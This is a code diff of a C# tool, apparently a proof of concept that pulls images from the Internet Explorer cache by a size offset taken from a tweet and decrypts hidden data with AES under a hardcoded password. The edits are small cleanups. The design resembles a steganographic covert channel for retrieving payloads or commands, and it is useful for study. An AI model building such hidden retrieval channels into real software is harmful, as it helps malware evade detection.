@@ -12,10 +12,10 @@ namespace tDiscoverer
 {
     class Program
     {
-        // change values with test web page reference and fresh salt
+        // change values with test web page and fresh salt obtain from Uploader
         private static string _malurl = "http://127.0.0.1/projects/test/test.html";
         private static string _pageref = "http://127.0.0.1/projects/test/";
-        private static int _offset = 91814;
+        private static int _offset = 0;
         private static string _password = "Pas5pr@se";
         private static string _salt = "";
 
@@ -101,12 +101,11 @@ namespace tDiscoverer
             byte[] plainTextBytes = null;
             ICryptoTransform decryptor = null;
 
+            PasswordDeriveBytes key = new PasswordDeriveBytes(passwordBytes, saltBytes, DEFAULT_HASH_ALGORITHM, PASSWORD_ITERATIONS);
 
             RijndaelManaged AES = new RijndaelManaged();
             AES.KeySize = DEFAULT_KEY_SIZE;
             AES.Mode = CipherMode.CBC;
-
-            PasswordDeriveBytes key = new PasswordDeriveBytes(passwordBytes, saltBytes, DEFAULT_HASH_ALGORITHM, PASSWORD_ITERATIONS);
 
             // Get Key And IV From Password And Salt
             AES.Key = key.GetBytes(AES.KeySize / 8);
@@ -214,7 +213,7 @@ namespace tDiscoverer
             foreach (mshtml.IHTMLImgElement img in images)
             {
                 imgList.Add(img.nameProp, Convert.ToInt32(img.fileSize));
-                Console.WriteLine("\nImage File Name {0}:\nImage File Size:{1}\n", img.nameProp, img.fileSize);
+                Console.WriteLine("\nImage File Name: {0}\nImage File Size: {1}\n", img.nameProp, img.fileSize);
             }
             // Close Internet Explorer
             ie.Quit();
@@ -222,7 +221,7 @@ namespace tDiscoverer
             Console.ReadLine();
             #endregion
 
-            #region Get image and select by filesize
+            #region Get images and select by filesize
             /**
              * Get images from IE cache  at least as large as the offset specified in the tweet
              * */
